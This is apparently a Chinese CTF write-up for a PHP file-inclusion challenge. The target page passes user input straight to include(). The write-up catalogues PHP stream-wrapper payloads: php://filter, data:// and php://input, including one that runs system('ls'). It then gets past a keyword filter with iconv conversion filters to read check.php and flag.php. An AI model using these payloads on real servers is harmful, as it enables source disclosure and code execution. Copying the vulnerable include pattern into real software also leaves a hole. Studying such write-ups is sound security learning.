# 题目： file_include

[![p90PvnJ.md.png](https://s1.ax1x.com/2023/05/08/p90PvnJ.md.png)](https://imgse.com/i/p90PvnJ)

+ 打开网页，是PHP代码审计，有关文件包含函数的运用，代码如下：

  ```php
  <?php
  highlight_file(__FILE__);
      include("./check.php");
      if(isset($_GET['filename'])){
          $filename  = $_GET['filename'];
          include($filename);
      }
  ?>
  ```

## 代码分析

1. `include(file)`：将`file`下的PHP文件插入到当前PHP文件中（在服务器执行`file`之前），后续的代码可以直接使用它的变量，函数，类等等；
   + `require(file)`跟`include(file)`功能相同，只是当文件不存在时，`require`会报错并停止运行，`include`会发出警告继续执行代码；

## 解题过程

+ 本题提供文件包含问题的一个思路：利用php://filter伪协议查看源文件；

  `include(file)`，`file`参数通常由GET或POST请求得到，当请求为php://filter协议包装时，可以绕过一些文件检查；

### php伪协议总结

####  php://filter伪协议

+ php://filter是php中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如base64编码处理，rot13处理等；

+ filter的一般语法：

  ```
  php://filter/过滤器/resource=待过滤的数据流
  ```

  - 过滤器可以设置多个，按顺序依次对数据流进行过滤；过滤器大致可分为四类：字符串过滤器、转换过滤器、压缩过滤器、加密过滤器；
  - 过滤器中的可以是`read=`（读文件）或`write=`（写文件），若没有指明则默认是读；`read`有可能被当做关键词而屏蔽；

1. 字符串过滤

   举例语法：

   ```
   php://filter/read=string.rot13/resource=data://text/plain,abcdefg       #rot13编码
   php://filter/read=string.toupper/resource=data://text/plain,abcdefg     #大写转化，小写转化使用tolower
   php://filter/read=string.strip_tags/resource=data://text/plain,<a>s</a> #去除PHP，HTML标签
   ```

2. 转化过滤器

   举例语法：

   ```
   php://filter/read=convert.base64-encode/resource=data://text/plain,m1sn0w           #base64编码
   php://filter/read=convert.quoted-printable-encode/resource=data://text/plain,m1sn0w #将不能用ASCII表示的字符转化为两位十六进制数(8bit)
   php://filter/zlib.deflate/resource=flag.php                                         #将数据流进行压缩
   php://filter/zlib.deflate|zlib.inflate/resource=flag.php                            #将数据流进行解压缩
   #压缩解压缩过滤器也可以用：bzip2.compress和bzip2.decompress
   php://filter/read=convert.iconv.utf-8.utf-16/resource=data://text/plain,m1sn0w      #将输入的字符串编码转化为输出的字符串编码
   #格式为：convert.iconv.<input-encoding>.<output-encoding> 或者 convert.iconv.<input-encoding>/<output-encoding>
   ```

   convert.iconv支持的编码格式如下：

   ```
   UCS-4*
   UCS-4BE
   UCS-4LE*
   UCS-2
   UCS-2BE
   UCS-2LE
   UTF-32*
   UTF-32BE*
   UTF-32LE*
   UTF-16*
   UTF-16BE*
   UTF-16LE*
   UTF-7
   UTF7-IMAP
   UTF-8*
   ASCII*
   EUC-JP*
   SJIS*
   eucJP-win*
   SJIS-win*
   ```

#### zip://, bzip2://, zlib://协议

+ zip://， bzip2://，zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg，png，gif，xxx等等；

+ 举例语法：

  ```
  zip://\var\WWW\phpinfo.jpg#phpinfo.txt #压缩phpinfo.txt文件为phpinfo.zip,重命名压缩包为phpinfo.jpg，再上传
  compress.bzip2://\var\WWW\phpinfo.bz2  #压缩phpinfo.txt文件为phpinfo.bz2并上传
  compress.zlib://\var\WWW\phpinfo.gz    #压缩phpinfo.txt文件为phpinfo.gz并上传
  #它们均支持将压缩包修改为任意的后缀名
  ```

#### data://协议

+ data://可以封装数据，用来传递数据，传递时会被认为是一个文件，可以被`file_get_content()`正确解析；

+ 举例语法：

  ```
  data://text/plain,<?php phpinfo();?> #不做处理，直接传递字符串
  data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+ #将字符串进行base64解码再传递字符串
  ```

#### php://input协议

+ php://input可以访问请求的原始数据的只读流，用于执行PHP代码；

+ 举例语法：

  ```
  POST /?file=php://input HTTP/1.1
  ...
  <?php system("ls");?>
  ```

  注意需要采用POST方式提交，在表单`enctype="multipart/form-data"`时，执行无效；

### 构造payload

回到本题中，我们可以先尝试使用php://filter读取check.php的文件

payload如下：

```
php://fil1ter/convert.base64-encode/resource=index.php
```

[![p90E8Gq.md.png](https://s1.ax1x.com/2023/05/08/p90E8Gq.md.png)](https://imgse.com/i/p90E8Gq)

 结果被屏蔽了，可能是屏蔽了base64关键字；

对比payload：

```
?filename=php://fil1ter/con1vert.b1ase64-e1ncode/resource=check.php
?filename=php://fil1ter/con1vert.base64-e1ncode/resource=check.php
```

发现base64确实是被过滤了，我们再尝试使用其他的过滤器；

```
?filename=php://filter/string.rot13/resource=check.php
?filename=php://filter/convert.iconv.utf-8.utf-16/resource=check .php
```

发现rot13被屏蔽，iconv有多种编码格式，需要进一步尝试是否被屏蔽，使用BurpSuite Intruder测试；

#### [BurpSuite爆破的四种方式讲解](https://blog.csdn.net/weixin_43487849/article/details/116084562)

Attack方式选择Cluster bomb，如下：

[![p90KZkD.md.png](https://s1.ax1x.com/2023/05/08/p90KZkD.md.png)](https://imgse.com/i/p90KZkD)

通过观察Response长度即可大致判断是否测试成功，有很多种编码都能正确返回check.php的内容

[![p90Kvut.md.png](https://s1.ax1x.com/2023/05/08/p90Kvut.md.png)](https://imgse.com/i/p90Kvut)

一个可能的payload如下：

```
?filename=php://filter/convert.iconv.SJIS-win*.UCS-4*/resource=check.php
```

观察check.php，确实是过滤了`/base be encode print zlib quoted write rot13 string`这些关键词；

并没有给出flag的信息，我们尝试访问`flag.php`也许能得到`flag`，payload如下：

```
?filename=php://filter/convert.iconv.SJIS-win*.UCS-4*/resource=flag.php
```

[![p90MuUU.md.png](https://s1.ax1x.com/2023/05/08/p90MuUU.md.png)](https://imgse.com/i/p90MuUU)

成功得到flag。
